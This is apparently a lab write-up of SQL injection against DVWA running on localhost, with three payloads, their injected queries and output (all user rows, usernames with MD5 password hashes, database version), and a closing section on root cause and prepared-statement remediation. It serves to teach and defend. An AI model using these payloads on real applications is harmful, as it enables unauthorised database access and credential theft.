# SQL Injection Payload Log and Analysis

## Target
- Application: DVWA (Damn Vulnerable Web Application)
- Module: SQL Injection
- Security Level: Low
- Target URL: http://127.0.0.1/DVWA/vulnerabilities/sqli/
- Database: MariaDB 11.4.5

---

## Payload 1: Basic OR Injection

**Payload:**
1' OR '1'='1

**Injected Query:**
```sql
SELECT * FROM users WHERE user_id = '1' OR '1'='1'
```

**Output:**
ID: 1' OR '1'='1 - First name: admin, Surname: admin
ID: 1' OR '1'='1 - First name: Gordon, Surname: Brown
ID: 1' OR '1'='1 - First name: Hack, Surname: Me
ID: 1' OR '1'='1 - First name: Pablo, Surname: Picasso
ID: 1' OR '1'='1 - First name: Bob, Surname: Smith

**Analysis:**
The OR condition makes the WHERE clause always evaluate to true, causing the database to return all rows in the users table. Instead of returning one user, all 5 users were returned. This demonstrates authentication bypass and data enumeration via SQL injection.

**Severity:** High

---

## Payload 2: UNION-Based Password Hash Extraction

**Payload:**
1' UNION SELECT user, password FROM users#

**Injected Query:**
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1'
UNION SELECT user, password FROM users#
```

**Output:**
admin : 5f4dcc3b5aa765d61d8327deb882cf99
gordonb : e99a18c428cb38d5f260853678922e03
1337 : 8d3533d75ae2c3966d7e0d4fcc69216b
pablo : 0d107d09f5bbe40cade3de5c71e9e9b7
smithy : 5f4dcc3b5aa765d61d8327deb882cf99

**Analysis:**
The UNION SELECT statement appended a second query to the original, selecting usernames and password hashes from the users table. The # symbol comments out the remainder of the original query. All 5 password hashes were extracted. The hash 5f4dcc3b5aa765d61d8327deb882cf99 is the MD5 hash of the word "password", confirming that weak hashing combined with SQL injection leads to full credential compromise.

**Severity:** Critical

---

## Payload 3: Database Reconnaissance

**Payload:**
1' UNION SELECT version(), database()#

**Injected Query:**
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1'
UNION SELECT version(), database()#
```

**Output:**
First name: 11.4.5-MariaDB-1
Surname: dvwa

**Analysis:**
This payload extracted the database version (MariaDB 11.4.5) and current database name (dvwa). Attackers use this information for reconnaissance to identify version-specific vulnerabilities and confirm the database structure before launching more targeted attacks.

**Severity:** Medium

---

## Summary of Findings

| Payload | Technique | Data Exposed | Severity |
|---------|-----------|--------------|----------|
| `1' OR '1'='1` | Boolean-based injection | All user records | High |
| `1' UNION SELECT user, password FROM users#` | UNION-based injection | Usernames and password hashes | Critical |
| `1' UNION SELECT version(), database()#` | UNION-based reconnaissance | Database version and name | Medium |

---

## Root Cause

The vulnerability exists because user input is directly concatenated into the SQL query without sanitization or parameterization. The vulnerable code pattern looks like:

```php
$query = "SELECT * FROM users WHERE user_id = '$id'";
```

When the attacker inputs `1' OR '1'='1`, the query becomes:

```sql
SELECT * FROM users WHERE user_id = '1' OR '1'='1'
```

The database executes this as valid SQL, returning unintended results.

---

## Remediation

The fix is to use parameterized queries (also called prepared statements), which separate SQL code from user input:

```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE user_id = ?");
$stmt->execute([$id]);
```

With parameterized queries, user input is never interpreted as SQL code. Even if an attacker inputs `1' OR '1'='1`, it is treated as a literal string value rather than SQL syntax, and the injection fails.
